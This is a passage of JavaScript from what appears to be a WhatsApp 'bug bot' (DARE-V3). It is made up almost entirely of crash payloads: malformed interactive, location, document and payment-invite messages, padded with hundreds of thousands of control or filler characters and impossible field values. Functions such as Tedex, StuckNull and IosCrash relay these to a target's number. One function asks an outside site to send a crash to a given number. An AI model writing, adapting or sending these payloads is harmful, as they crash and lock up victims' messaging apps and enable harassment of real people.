							"buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"️࿆᷍👑𝐘 𝐊𝐈𝐍𝐆 𝐁𝐀𝐃𝐁𝐎𝐈𝐧 𝑪͢𝒓𝒂ͯ͢𝒔𝒉 𝐈𝐧͢𝐟𝐢ͮ𝐧͢𝐢𝐭𝐲͜͡⃟╮\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
						}]
					}
				}
			}
		}
		
		async function sendCrash(X) {
			try {
				const newcrash = await
fetchJson('https://venomweb.site/i/sendCrashlphone?numero=' + target + '&total=1&apikey=xeonkey' );
				console.log(chalk.red("𝐃𝐀𝐑𝐄-𝐕𝟑 Succes Send Bug By ©𝐁.𝐌.𝐁 👑"));
				console.log(chalk.red("InVisible⚡"));
			} catch (error) {
				console.error("Error Fetching Crash:", error);
			}
		}
		// HAX \\
		const Qrad = {
			key: {
				remoteJid: 'p',
				fromMe: false,
				participant: '0@s.whatsapp.net'
			},
			message: {
				"interactiveResponseMessage": {
					"body": {
						"text": "Sent",
						"format": "DEFAULT"
					},
					"nativeFlowResponseMessage": {
						"name": "galaxy_message",
						"paramsJson": `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"𝐃𝐀𝐑𝐄-𝐕𝟑 𝐈𝐬 𝐇𝐞𝐫𝐞 👑\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"@RizxzNewtech\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"⭑̤⟅̊༑ 𝐃𝐀𝐑𝐄-𝐕𝟑χ ⿻ ㄈ尺ΛらнらϤらŤƐ௱ ⿻ ▾ ༑̴⟆̊‏‎‏‎‏‎‏⭑̤${"\u0003".repeat(1045000)}\",\"screen_0_TextInput_1\":\"INFINITE\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
						"version": 3
					}
				}
			}
		}


		const VisiX = {
			key: {
				remoteJid: 'p',
				fromMe: false,
				participant: '0@s.whatsapp.net'
			},
			message: {
				"interactiveResponseMessage": {
					"body": {
						"text": "Sent",
						"format": "DEFAULT"
					},
					"nativeFlowResponseMessage": {
						"name": "galaxy_message",
						"paramsJson": `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"𝐃𝐀𝐑𝐄-𝐕𝟑 𝐈𝐬 𝐇𝐞𝐫𝐞 👑\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"@RizxzNewtech\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"⭑̤⟅̊༑ 𝐃𝐀𝐑𝐄-𝐕𝟑χ ⿻ ㄈ尺ΛらнらϤらŤƐ௱ ⿻ ▾ ༑̴⟆̊‏‎‏‎‏‎‏⭑̤${"\u0003".repeat(1020000)}\",\"screen_0_TextInput_1\":\"INFINITE\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
						"version": 3
					}
				}
			}
		}

		const VisiXLoc = {
			key: {
				remoteJid: 'p',
				fromMe: false,
				participant: '0@s.whatsapp.net'
			},
			message: {
				"interactiveResponseMessage": {
					"body": {
						"text": "Sent",
						"format": "DEFAULT"
					},
					"nativeFlowResponseMessage": {
						"name": "galaxy_message",
						"paramsJson": `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"𝐃𝐀𝐑𝐄-𝐕𝟑 𝐈𝐬 𝐇𝐞𝐫𝐞 👑\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"@RizxzNewtech\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"⭑̤⟅̊༑ 𝐃𝐀𝐑𝐄-𝐕𝟑χ ⿻ ㄈ尺ΛらнらϤらŤƐ௱ ⿻ ▾ ༑̴⟆̊‏‎‏‎‏‎‏⭑̤${"\u0003".repeat(777777)}\",\"screen_0_TextInput_1\":\"INFINITE\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
						"version": 3
					}
				}
			}
		}

		// ZNX INVASIONS \\

		async function InVisiLocNull(X, Qtd, ThM, ptcp = false) {
			let etc = generateWAMessageFromContent(X,
				proto.Message.fromObject({
					ephemeralMessage: {
						message: {
							interactiveMessage: {
								header: {
									title: "⭑̤⟅̊༑ 𝐃𝐀𝐑𝐄-𝐕𝟑χ ⿻ ㄈ尺ΛらнらϤらŤƐ௱ ⿻ ▾ ༑̴⟆̊‏‎‏‎‏‎‏⭑̤‌‌‌‌‌‌‌‌‌‌‌‌‌‏" + "ꦾ".repeat(77777),
									"locationMessage": {
										"degreesLatitude": -999.03499999999999,
										"degreesLongitude": 922.999999999999,
										"name": "𝐃𝐀𝐑𝐄-𝐕𝟑ㄈ尺Λらн👑️",
										"address": "👺༑⌁⃰𝐃𝐀𝐑𝐄-𝐕𝟑 𝐂𝐫𝐚𝐬𝐡 👑👑️",
										"jpegThumbnail": ThM
									},
									hasMediaAttachment: true
								},
								body: {
									text: ""
								},
								nativeFlowMessage: {
									messageParamsJson: " 𝐃𝐀𝐑𝐄-𝐕𝟑ㄈ尺Λらн 𝐁𝐔𝐆 𝐕𝟐👑️ ",
									buttons: [{
											name: "single_select",
											buttonParamsJson: {
												"title": "👺༑⌁⃰𝐃𝐀𝐑𝐄-𝐕𝟑 𝐂𝐫𝐚𝐬𝐡 👑👑️",
												"sections": [{
													"title": "𝐃𝐀𝐑𝐄-𝐕𝟑 𝐈𝐬 𝐇𝐞𝐫𝐞 👑",
													"rows": []
												}]
											}
										},
										{
											name: "call_permission_request",
											buttonParamsJson: {}
										}
									],
								},
							}
						}
					}
				}), {
					userJid: X,
					quoted: Qtd
				}
			);
			await Dare.relayMessage(X, etc.message, ptcp ? {
				participant: {
					jid: X
				}
			} : {});
			console.log(chalk.red("𝐃𝐀𝐑𝐄-𝐕𝟑 Succes Send Bug By ©𝐁.𝐌.𝐁 👑"));
		};

		async function InVisiLocXz(X, ThM, ptcp = false) {
			let etc = generateWAMessageFromContent(X,
				proto.Message.fromObject({
					ephemeralMessage: {
						message: {
							interactiveMessage: {
								header: {
									title: "⭑̤⟅̊༑ 𝐃𝐀𝐑𝐄-𝐕𝟑χ ⿻ ㄈ尺ΛらнらϤらŤƐ௱ ⿻ ▾ ༑̴⟆̊‏‎‏‎‏‎‏⭑̤‌‌‌‌‌‌‌‌‌‌‌‌‌‏",
									"locationMessage": {
										"degreesLatitude": -999.03499999999999,
										"degreesLongitude": 922.999999999999,
										"name": "𝐃𝐀𝐑𝐄-𝐕𝟑ㄈ尺Λらн👑️",
										"address": "👺༑⌁⃰𝐃𝐀𝐑𝐄-𝐕𝟑 𝐂𝐫𝐚𝐬𝐡 👑👑️",
										"jpegThumbnail": ThM
									},
									hasMediaAttachment: true
								},
								body: {
									text: ""
								},
								nativeFlowMessage: {
									messageParamsJson: " 𝐃𝐀𝐑𝐄-𝐕𝟑ㄈ尺Λらн 𝐁𝐔𝐆 𝐕𝟐👑️ ",
									buttons: [{
											name: "single_select",
											buttonParamsJson: {
												"title": "👺༑⌁⃰𝐃𝐀𝐑𝐄-𝐕𝟑 𝐂𝐫𝐚𝐬𝐡 👑👑️",
												"sections": [{
													"title": "𝐃𝐀𝐑𝐄-𝐕𝟑 𝐈𝐬 𝐇𝐞𝐫𝐞 👑",
													"rows": []
												}]
											}
										},
										{
											name: "call_permission_request",
											buttonParamsJson: {}
										}
									],
								},
							}
						}
					}
				}), {
					userJid: X,
					quoted: VisiXLoc
				}
			);
			await Dare.relayMessage(X, etc.message, ptcp ? {
				participant: {
					jid: X
				}
			} : {});
			console.log(chalk.red("𝐃𝐀𝐑𝐄-𝐕𝟑 Succes Send Bug By ©𝐁.𝐌.𝐁 👑"));
		};
								
		async function ClPm(X, ThM, cct = false, ptcp = false) {
			let etc = generateWAMessageFromContent(X,
				proto.Message.fromObject({
					viewOnceMessage: {
						message: {
							interactiveMessage: {
								header: {
									title: "",
									documentMessage: {
										url: "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
										mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
										fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
										fileLength: "9999999999999",
										pageCount: 9007199254740991,
										mediaKey: "EZ/XTztdrMARBwsjTuo9hMH5eRvumy+F8mpLBnaxIaQ=",
										fileName: "🩸𝐃𝐀𝐑𝐄-𝐕𝟑 𝐂𝐫𝐚𝐬𝐡 👑🦠",
										fileEncSha256: "oTnfmNW1xNiYhFxohifoE7nJgNZxcCaG15JVsPPIYEg=",
										directPath: "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0",
										mediaKeyTimestamp: "1723855952",
										contactVcard: true,
										thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
										thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
										thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
										jpegThumbnail: ThM
									},
									hasMediaAttachment: true
								},
								body: {
									text: "𝐃𝐀𝐑𝐄-𝐕𝟑ㄈ尺Λらн👑️"
								},
								nativeFlowMessage: {
									messageParamsJson: "{\"name\":\"galaxy_message\",\"title\":\"oi\",\"header\":\" # trashdex - explanation \",\"body\":\"xxx\"}",
									buttons: [
										cct ? {
											name: "single_select",
											buttonParamsJson: "{\"title\":\"👺༑⌁⃰𝐃𝐀𝐑𝐄-𝐕𝟑 𝐂𝐫𝐚𝐬𝐡 👑👑️" + "᬴".repeat(0) + "\",\"sections\":[{\"title𝐃𝐀𝐑𝐄-𝐕𝟑尺ɪẔχẔ 𝐈𝐬 𝐇𝐞𝐫𝐞👑ϟ\",\"rows\":[]}]}"
										} : {
											name: "payment_method",
											buttonParamsJson: ""
										},
										{
											name: "call_permission_request",
											buttonParamsJson: "{}"
										},
										{
											name: "payment_method",
											buttonParamsJson: "{}"
										},
										{
											name: "single_select",
											buttonParamsJson: "{\"title\":\"👺༑⌁⃰𝐃𝐀𝐑𝐄-𝐕𝟑 𝐂𝐫𝐚𝐬𝐡 👑👑️\",\"sections\":[{\"title𝐃𝐀𝐑𝐄-𝐕𝟑尺ɪẔχẔ 𝐈𝐬 𝐇𝐞𝐫𝐞👑ϟ\",\"rows\":[]}]}"
										},
										{
											name: "galaxy_message",
											buttonParamsJson: "{\"flow_action\":\"navigate\",\"flow_action_payload\":{\"screen\":\"WELCOME_SCREEN\"},\"flow_cta\":\"👑️\",\"flow_id\":\"BY DEVORSIXCORE\",\"flow_message_version\":\"9\",\"flow_token\":\"MYPENISMYPENISMYPENIS\"}"
										},
										{
											name: "mpm",
											buttonParamsJson: "{}"
										}
									]
								}
							}
						}
					}
				}), {
					userJid: X,
					quoted: EsQl
				}
			);

			await Dare.relayMessage(X, etc.message, ptcp ? {
				participant: {
					jid: X
				}
			} : {});
			console.log(chalk.red("𝐃𝐀𝐑𝐄-𝐕𝟑 Succes Send Bug By ©𝐁.𝐌.𝐁 👑"));
		};

		async function ClPmNull(X, Qtd, ThM, cct = false, ptcp = false) {
			let etc = generateWAMessageFromContent(X,
				proto.Message.fromObject({
					viewOnceMessage: {
						message: {
							interactiveMessage: {
								header: {
									title: "",
									documentMessage: {
										url: "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
										mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
										fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
										fileLength: "9999999999999",
										pageCount: 9007199254740991,
										mediaKey: "EZ/XTztdrMARBwsjTuo9hMH5eRvumy+F8mpLBnaxIaQ=",
										fileName: "🩸𝐃𝐀𝐑𝐄-𝐕𝟑 𝐂𝐫𝐚𝐬𝐡 👑🦠",
										fileEncSha256: "oTnfmNW1xNiYhFxohifoE7nJgNZxcCaG15JVsPPIYEg=",
										directPath: "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0",
										mediaKeyTimestamp: "1723855952",
										contactVcard: true,
										thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
										thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
										thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
										jpegThumbnail: ThM
									},
									hasMediaAttachment: true
								},
								body: {
									text: "⭑̤⟅̊༑ 𝐃𝐀𝐑𝐄-𝐕𝟑χ ⿻ ㄈ尺ΛらнらϤらŤƐ௱ ⿻ ▾ ༑̴⟆̊‏‎‏‎‏‎‏⭑̤" + "ꦾ".repeat(77777)
								},
								nativeFlowMessage: {
									messageParamsJson: "{\"name\":\"galaxy_message\",\"title\":\"oi\",\"header\":\" # trashdex - explanation \",\"body\":\"xxx\"}",
									buttons: [
										cct ? {
											name: "single_select",
											buttonParamsJson: "{\"title\":\"👺༑⌁⃰𝐃𝐀𝐑𝐄-𝐕𝟑 𝐂𝐫𝐚𝐬𝐡 👑👑️" + "᬴".repeat(0) + "\",\"sections\":[{\"title𝐃𝐀𝐑𝐄-𝐕𝟑尺ɪẔχẔ 𝐈𝐬 𝐇𝐞𝐫𝐞👑ϟ\",\"rows\":[]}]}"
										} : {
											name: "payment_method",
											buttonParamsJson: ""
										},
										{
											name: "call_permission_request",
											buttonParamsJson: "{}"
										},
										{
											name: "payment_method",
											buttonParamsJson: "{}"
										},
										{
											name: "single_select",
											buttonParamsJson: "{\"title\":\"👺༑⌁⃰𝐃𝐀𝐑𝐄-𝐕𝟑 𝐂𝐫𝐚𝐬𝐡 👑👑️\",\"sections\":[{\"title𝐃𝐀𝐑𝐄-𝐕𝟑尺ɪẔχẔ 𝐈𝐬 𝐇𝐞𝐫𝐞👑ϟ\",\"rows\":[]}]}"
										},
										{
											name: "galaxy_message",
											buttonParamsJson: "{\"flow_action\":\"navigate\",\"flow_action_payload\":{\"screen\":\"WELCOME_SCREEN\"},\"flow_cta\":\"👑️\",\"flow_id\":\"BY DEVORSIXCORE\",\"flow_message_version\":\"9\",\"flow_token\":\"MYPENISMYPENISMYPENIS\"}"
										},
										{
											name: "mpm",
											buttonParamsJson: "{}"
										}
									]
								}
							}
						}
					}
				}), {
					userJid: X,
					quoted: Qtd
				}
			);

			await Dare.relayMessage(X, etc.message, ptcp ? {
				participant: {
					jid: X
				}
			} : {});
			console.log(chalk.red("𝐃𝐀𝐑𝐄-𝐕𝟑 Succes Send Bug By © 𝐁.𝐌.𝐁👑"));
		};

		async function ZnX(X, Txt, Amount, Ptcp = true) {
			await Dare.relayMessage(X, {
					viewOnceMessage: {
						message: {
							interactiveResponseMessage: {
								body: {
									text: Txt,
									format: "EXTENSIONS_1"
								},
								nativeFlowResponseMessage: {
									name: 'galaxy_message',
									paramsJson: `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"TrashDex Superior\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"devorsixcore@trash.lol\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons${"\u0000".repeat(Amount)}\",\"screen_0_TextInput_1\":\"Anjay\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
									version: 3
								}
							}
						}
					}
				},
				Ptcp ? {
					participant: {
						jid: X
					}
				} : {}
			);
			console.log(chalk.red("𝐃𝐀𝐑𝐄-𝐕𝟑 Succes Send Bug By ©𝐁.𝐌.𝐁👑"));
		};

		async function CrL(X, Qtd, Txt, Ptcp = true) {
			let etc = generateWAMessageFromContent(X, proto.Message.fromObject({
				viewOnceMessage: {
					message: {
						interactiveMessage: {
							header: {
								title: "",
								locationMessage: {},
								hasMediaAttachment: true
							},
							body: {
								text: Txt
							},
							nativeFlowMessage: {
								messageParamsJson: " znx guarantees all phones :) \n\n\n I know, you tried to copy this bug with m.quoted/m.message, right ? "
							},
							carouselMessage: {}
						}
					}
				}
			}), {
				userJid: X,
				quoted: Qtd
			});

			await Dare.relayMessage(X, etc.message, Ptcp ? {
				participant: {
					jid: X
				}
			} : {});
			console.log(chalk.red("𝐃𝐀𝐑𝐄-𝐕𝟑 Succes Send Bug By ©𝐁.𝐌.𝐁 👑"));
		};

		async function ZnXIvS(X, Ptcp = true) {
			let etc = generateWAMessageFromContent(X, proto.Message.fromObject({
				viewOnceMessage: {
					message: {
						interactiveMessage: {
							header: {
								title: "",
								locationMessage: {},
								hasMediaAttachment: true
							},
							body: {
								text: "⭑̤⟅̊༑ 𝐃𝐀𝐑𝐄-𝐕𝟑χ ⿻ ㄈ尺ΛらнらϤらŤƐ௱ ⿻ ▾ ༑̴⟆̊‏‎‏‎‏‎‏⭑̤"
							},
							nativeFlowMessage: {
								name: "call_permission_request",
								messageParamsJson: " 𝐃𝐀𝐑𝐄-𝐕𝟑ㄈ尺Λらн👑️ "
							},
							carouselMessage: {}
						}
					}
				}
			}), {
				userJid: X,
				quoted: Qrad
			});

			await Dare.relayMessage(X, etc.message, Ptcp ? {
				participant: {
					jid: X
				}
			} : {});
			console.log(chalk.red("𝐃𝐀𝐑𝐄-𝐕𝟑 Succes Send Bug By ©King badboi 👑"));
		};

		async function OutOff(X, Ptcp = true) {
			let etc = generateWAMessageFromContent(X, proto.Message.fromObject({
				viewOnceMessage: {
					message: {
						interactiveMessage: {
							header: {
								title: "⭑̤⟅̊༑ 𝐃𝐀𝐑𝐄-𝐕𝟑χ ⿻ ㄈ尺ΛらнらϤらŤƐ௱ ▾ ༑̴⟆̊⿻‏‎‏‎‏‎‏‏‎‏‎‏‎‏",
								locationMessage: {},
								hasMediaAttachment: true
							},
							body: {
								text: ""
							},
							nativeFlowMessage: {
								messageParamsJson: " ZnX Company Tagline Here!! \n\n\n You Stupid?? ",
								buttons: [{
									name: "payment_info",
									buttonParamsJson: `{\"currency\":\"IRP\",\"total_amount\":{\"value\":0,\"offset\":100},\"reference_id\":\"4P46GMY57GC\",\"type\":\"physical-goods\",\"order\":{\"status\":\"pending\",\"subtotal\":{\"value\":0,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"name\":\"\",\"amount\":{\"value\":0,\"offset\":100},\"quantity\":0,\"sale_amount\":{\"value\":0,\"offset\":100}}]},\"payment_settings\":[{\"type\":\"pix_static_code\",\"pix_static_code\":{\"merchant_name\":\"XXX\",\"key\":\"+99999999999\",\"key_type\":\"XXX\"}}]}`
								}],
							},
						}
					}
				}
			}), {
				userJid: X
			});
			await Dare.relayMessage(X, etc.message, Ptcp ? {
				participant: {
					jid: X
				}
			} : {});
		}
		
		async function Tedex(X, QTD) {
			await Dare.relayMessage(X, {
				'viewOnceMessage': {
					'message': {
						'interactiveMessage': {
							'header': {
								'title': '',
								'locationMessage': {},
								'hasMediaAttachment': true
							},
							'body': {
								'text': '𝐃𝐀𝐑𝐄-𝐕𝟑ㄈ尺Λらн👑️' + '\x00'.repeat(950000)
							},
							'nativeFlowMessage': {
								'messageParamsJson': '\x00'
							},
							'carouselMessage': {}
						}
					}
				}
			}, {
				participant: {
					jid: X
				}
			});
			await Dare.sendMessage(X, {
				text: `𝐁.𝐌.𝐁   𝐂𝐑𝐀𝐒𝐇\`👑`
			}, {
				quoted: QTD
			});
			console.log(chalk.red("𝐃𝐀𝐑𝐄-𝐕𝟑 Succes Send Bug By ©𝐁.𝐌.𝐁 👑"));
		};

		async function IosCrash(LockJids) {
			await Dare.relayMessage(LockJids, {
				"paymentInviteMessage": {
					serviceType: "FBPAY",
					expiryTimestamp: Date.now() + 1814400000
				}
			}, {
				participant: {
					jid: LockJids
				}
			})
			console.log(chalk.red("𝐃𝐀𝐑𝐄-𝐕𝟑 Succes Send Bug By ©𝐁.𝐌.𝐁 👑"));
		};

		
		async function XiosPay(jid) {
			Dare.relayMessage(jid, {
				'paymentInviteMessage': {
					'serviceType': "UPI",
					'expiryTimestamp': Date.now() + 86400000
				}
			}, {
				'participant': {
					'jid': jid
				}
			});
			console.log(chalk.red("𝐃𝐀𝐑𝐄-𝐕𝟑 Succes Send Bug By © 𝐁.𝐌.𝐁👑"));
		};

		async function StuckNull(X, ThM, Ptcp = true) {
			await Dare.relayMessage(X, {
					ephemeralMessage: {
						message: {
							interactiveMessage: {
								header: {
									documentMessage: {
										url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
										mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
										fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
										fileLength: "9999999999999",
										pageCount: 1316134911,
										mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
										fileName: "⭑̤⟅̊༑ 𝐃𝐀𝐑𝐄-𝐕𝟑χ ⿻ ㄈ尺ΛらнらϤらŤƐ௱ ⿻ ▾ ༑̴⟆̊‏‎‏‎‏‎‏⭑̤",
										fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
										directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
										mediaKeyTimestamp: "1726867151",
										contactVcard: true,
										jpegThumbnail: ThM,
									},
									hasMediaAttachment: true,
								},
								body: {
									text: "⭑̤⟅̊༑ 𝐃𝐀𝐑𝐄-𝐕𝟑χ ⿻ ㄈ尺ΛらнらϤらŤƐ௱ ⿻ ▾ ༑̴⟆̊‏‎‏‎‏‎‏⭑̤\n" + "ꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾ".repeat(17000),
								},
								nativeFlowMessage: {
									buttons: [{
											name: "cta_url",
											buttonParamsJson: "{ display_text: '👺༑⌁⃰𝐃𝐀𝐑𝐄-𝐕𝟑 𝐂𝐫𝐚𝐬𝐡 👑👑️', url: \"https://youtube.com/Akmalscar1\", merchant_url: \"https://youtube.com/Akmalscar1\" }",
										},
										{
											name: "call_permission_request",
											buttonParamsJson: "{}",
										},
									],
									messageParamsJson: "{}",
								},
								contextInfo: {
									mentionedJid: ["62895364760801@s.whatsapp.net"],
									forwardingScore: 1,
									isForwarded: true,
									fromMe: false,
									participant: "0@s.whatsapp.net",
									remoteJid: "status@broadcast",
									quotedMessage: {
										documentMessage: {
											url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
											mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
											fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
											fileLength: "9999999999999",
											pageCount: 1316134911,
											mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
											fileName: "𝐃𝐀𝐑𝐄-𝐕𝟑ㄈ尺Λらн 𝐁𝐔𝐆 𝐕𝟐👑️",
											fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
											directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
											mediaKeyTimestamp: "1724474503",
											contactVcard: true,
											thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
											thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
											thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
											jpegThumbnail: "",
										},
									},
								},
							},
						},
					},
				},
				Ptcp ? {
					participant: {
						jid: X
					}
				} : {}
			);
			console.log(chalk.red("𝐃𝐀𝐑𝐄-𝐕𝟑 Succes Send Bug By ©𝐁.𝐌.𝐁 👑"));
		};

		async function StuckSql(X, ThM, Ptcp = true) {
			let etc = generateWAMessageFromContent(X,
				proto.Message.fromObject({
					ephemeralMessage: {
						message: {
							interactiveMessage: {
								header: {
									documentMessage: {
										url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
										mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
										fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
										fileLength: "9999999999999",
										pageCount: 1316134911,
										mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
										fileName: "⭑̤⟅̊༑ 𝙎𝘾𝘼𝙍𝙇𝙀𝙏 𝐕5χ ⿻ ㄈ尺ΛらнらϤらŤƐ௱ ⿻ ▾ ༑̴⟆̊‏‎‏‎‏‎‏⭑̤",
										fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
										directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
										mediaKeyTimestamp: "1726867151",
										contactVcard: true,
										jpegThumbnail: ThM,
									},
									hasMediaAttachment: true,
								},
								body: {
									text: "⭑̤⟅̊༑ 𝐃𝐀𝐑𝐄-𝐕𝟑χ ⿻ ㄈ尺ΛらнらϤらŤƐ௱ ⿻ ▾ ༑̴⟆̊‏‎‏‎‏‎‏⭑̤\n" + "ꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾ".repeat(17000),
								},
								nativeFlowMessage: {
									buttons: [{
											name: "cta_url",
											buttonParamsJson: "{ display_text: '👺༑⌁⃰𝐃𝐀𝐑𝐄-𝐕𝟑 𝐂𝐫𝐚𝐬𝐡 👑👑️', url: \"https://youtube.com/Akmalscar1\", merchant_url: \"https://youtube.com/Akmalscar1\" }",
										},
										{
											name: "call_permission_request",
											buttonParamsJson: "{}",
										},
									],
									messageParamsJson: "{}",
								},
								contextInfo: {
									mentionedJid: ["62895364760801@s.whatsapp.net"],
									forwardingScore: 1,
									isForwarded: true,
									fromMe: false,
									participant: "0@s.whatsapp.net",
									remoteJid: "status@broadcast",
